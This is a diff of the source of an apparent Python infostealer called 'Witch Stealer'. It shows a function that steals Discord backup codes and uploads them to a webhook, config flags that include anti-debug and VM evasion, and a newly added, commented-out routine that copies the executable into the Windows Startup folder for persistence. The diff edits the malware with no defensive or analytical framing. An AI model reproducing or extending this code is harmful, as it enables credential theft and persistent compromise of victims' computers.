@@ -24,7 +24,7 @@ from ctypes import wintypes, byref, c_bool
 from Crypto.Cipher import AES
 
 __CONFIG__ = {
-    "avatar_link": "https://cdn.pfps.gg/pfps/95787-angel-girl-3.jpeg",
+    "avatar_link": "https://cdn.pfps.gg/pfps/56483-dark-girl.jpeg",
     "webhook": "",
     "discord": False,
     "system": False,
@@ -590,6 +590,19 @@ def discord_backup_code_steal():
         files = {'file': ('discord_backup_codes.txt', f)}
         requests.post(__CONFIG__["webhook"], json={"username": "Witch Stealer", "avatar_url": __CONFIG__['avatar_link']}, files=files)
 
+
+#def startup():
+#   startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
+#
+#   current_file = sys.argv[0]
+#    filename = os.path.basename(current_file)
+#
+#   target_path = os.path.join(startup_path, filename)
+#
+#    if not os.path.exists(target_path):
+#        shutil.copy(current_file, target_path)
+#    else:
+#        return
 
 def run_config():
     if __CONFIG__.get("Anti_Debugs_VM"):
